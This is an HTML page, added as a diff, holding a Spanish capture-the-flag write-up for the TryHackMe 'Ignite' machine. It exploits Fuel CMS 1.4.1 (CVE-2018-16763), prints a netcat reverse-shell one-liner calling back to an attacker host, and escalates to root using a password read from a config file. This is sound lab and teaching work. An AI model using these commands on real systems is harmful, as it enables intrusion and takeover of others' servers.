@@ -1,0 +1,181 @@
+<!DOCTYPE html>
+<html lang="es" data-bs-theme="dark">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>THM - Ignite | cat4clysm</title>
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet" />
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css" rel="stylesheet" />
+  <link href="../style.css" rel="stylesheet" />
+  <link href="writeup.css" rel="stylesheet" />
+</head>
+<body>
+
+  <!-- Navbar -->
+  <nav class="navbar navbar-dark fixed-top" id="mainNav">
+    <div class="container">
+      <a class="navbar-brand fw-bold text-danger" href="../index.html">&gt;_ cat4clysm</a>
+      <a href="../index.html#writeups" class="btn btn-sm btn-outline-secondary">
+        <i class="bi bi-arrow-left"></i> Volver
+      </a>
+    </div>
+  </nav>
+
+  <main class="container py-5 mt-5">
+
+    <!-- Header -->
+    <div class="writeup-header p-4 rounded mb-4">
+      <div class="d-flex flex-wrap gap-2 mb-3">
+        <span class="badge bg-info text-dark fs-6">TryHackMe</span>
+        <span class="badge bg-warning text-dark fs-6">Medium</span>
+        <span class="badge bg-secondary">Linux</span>
+        <span class="badge bg-secondary">Web</span>
+        <span class="badge bg-secondary">RCE</span>
+      </div>
+      <h1 class="text-white fw-bold mb-1">Ignite</h1>
+      <p class="text-secondary mb-3">Máquina que corre Fuel CMS 1.4.1, vulnerable a Remote Code Execution (CVE-2018-16763). Explotamos el CMS para obtener shell y escalamos usando credenciales en un archivo de configuración.</p>
+      <div class="d-flex flex-wrap gap-3 text-secondary small">
+        <span><i class="bi bi-calendar3"></i> 2025</span>
+        <span><i class="bi bi-clock"></i> ~45 min</span>
+        <span><i class="bi bi-person"></i> cat4clysm</span>
+      </div>
+    </div>
+
+    <!-- Tools used -->
+    <div class="mb-4">
+      <h5 class="text-danger border-left-red mb-3"><i class="bi bi-tools"></i> Herramientas utilizadas</h5>
+      <div class="d-flex flex-wrap gap-2">
+        <span class="badge bg-dark border border-secondary p-2">nmap</span>
+        <span class="badge bg-dark border border-secondary p-2">gobuster</span>
+        <span class="badge bg-dark border border-secondary p-2">burp suite</span>
+        <span class="badge bg-dark border border-secondary p-2">python exploit</span>
+        <span class="badge bg-dark border border-secondary p-2">netcat</span>
+      </div>
+    </div>
+
+    <!-- Recon -->
+    <section class="mb-5">
+      <h4 class="text-info border-left-info mb-3"><i class="bi bi-search"></i> Reconocimiento</h4>
+      <p class="text-secondary">Escaneo inicial para detectar puertos y servicios.</p>
+
+      <div class="code-block mb-3">
+        <div class="code-header">
+          <span class="text-success">root@kali</span><span class="text-white">:~$</span>
+        </div>
+        <pre><code>nmap -sV -sC -oN ignite.nmap &lt;TARGET_IP&gt;</code></pre>
+      </div>
+
+      <div class="code-block mb-3">
+        <pre><code>PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.4.18
+| http-title: Welcome to Fuel CMS
+|_http-server-header: Apache/2.4.18 (Ubuntu)</code></pre>
+      </div>
+
+      <p class="text-secondary">Solo el puerto 80 abierto. Al visitar la web encontramos <span class="text-warning">Fuel CMS 1.4.1</span> con las credenciales por defecto visibles en la página de inicio: <code>admin / admin</code>.</p>
+
+      <div class="alert-custom p-3 rounded mb-3">
+        <i class="bi bi-exclamation-triangle text-warning me-2"></i>
+        <span class="text-warning">CVE-2018-16763</span> — Fuel CMS 1.4.1 permite RCE no autenticado a través del parámetro <code>fuel/pages/select/?filter=</code>.
+      </div>
+    </section>
+
+    <!-- Exploitation -->
+    <section class="mb-5">
+      <h4 class="text-danger border-left-red mb-3"><i class="bi bi-lightning-charge"></i> Explotación</h4>
+      <p class="text-secondary">Usamos un exploit público en Python para obtener una reverse shell.</p>
+
+      <div class="code-block mb-3">
+        <div class="code-header">
+          <span class="text-success">root@kali</span><span class="text-white">:~$</span>
+        </div>
+        <pre><code>python3 exploit.py -u http://&lt;TARGET_IP&gt;</code></pre>
+      </div>
+
+      <p class="text-secondary">Desde la consola del exploit, lanzamos una reverse shell:</p>
+
+      <div class="code-block mb-3">
+        <pre><code>cmd: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc &lt;LHOST&gt; 4444 &gt;/tmp/f</code></pre>
+      </div>
+
+      <div class="code-block mb-3">
+        <div class="code-header">
+          <span class="text-success">root@kali</span><span class="text-white">:~$</span>
+        </div>
+        <pre><code>nc -lvnp 4444
+
+listening on [any] 4444 ...
+connect to [LHOST] from (UNKNOWN) [TARGET] 49876
+$ whoami
+<span class="text-info">www-data</span></code></pre>
+      </div>
+    </section>
+
+    <!-- Privesc -->
+    <section class="mb-5">
+      <h4 class="text-warning border-left-yellow mb-3"><i class="bi bi-arrow-up-right-circle"></i> Escalada de privilegios</h4>
+      <p class="text-secondary">Buscamos credenciales en los archivos de configuración de Fuel CMS.</p>
+
+      <div class="code-block mb-3">
+        <pre><code>cat /var/www/html/fuel/application/config/database.php</code></pre>
+      </div>
+
+      <div class="code-block mb-3">
+        <pre><code>'username' => 'root',
+'password' => '<span class="text-danger">mememe</span>',</code></pre>
+      </div>
+
+      <p class="text-secondary">Probamos la contraseña con el usuario root del sistema:</p>
+
+      <div class="code-block mb-3">
+        <pre><code>su root
+Password: mememe
+
+whoami
+<span class="text-danger fw-bold">root</span></code></pre>
+      </div>
+    </section>
+
+    <!-- Flags -->
+    <section class="mb-5">
+      <h4 class="text-warning border-left-yellow mb-3"><i class="bi bi-flag-fill"></i> Flags</h4>
+      <div class="row g-3">
+        <div class="col-md-6">
+          <div class="flag-card p-3 rounded">
+            <small class="text-secondary d-block mb-1"><i class="bi bi-person"></i> user.txt</small>
+            <code class="text-success">cat /home/www-data/flag.txt</code>
+            <div class="mt-2 text-muted fst-italic small">Flag obtenida</div>
+          </div>
+        </div>
+        <div class="col-md-6">
+          <div class="flag-card p-3 rounded">
+            <small class="text-secondary d-block mb-1"><i class="bi bi-shield-fill"></i> root.txt</small>
+            <code class="text-danger">cat /root/root.txt</code>
+            <div class="mt-2 text-muted fst-italic small">Flag obtenida</div>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- Lessons learned -->
+    <section class="mb-5">
+      <h4 class="text-success border-left-green mb-3"><i class="bi bi-lightbulb"></i> Lecciones aprendidas</h4>
+      <ul class="text-secondary">
+        <li>Nunca dejar credenciales por defecto en producción — <code>admin/admin</code> es lo primero que se prueba.</li>
+        <li>Los archivos de configuración de CMS frecuentemente contienen credenciales reutilizables.</li>
+        <li>CVE-2018-16763 es un RCE crítico que afecta Fuel CMS 1.4.1 y versiones anteriores.</li>
+      </ul>
+    </section>
+
+  </main>
+
+  <footer class="py-4 text-center border-top border-secondary">
+    <p class="text-secondary mb-0">
+      <span class="text-danger">&gt;_</span> cat4clysm &copy; 2025 &nbsp;·&nbsp;
+      <span class="text-muted">Hack the planet.</span>
+    </p>
+  </footer>
+
+  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
+</body>
+</html>
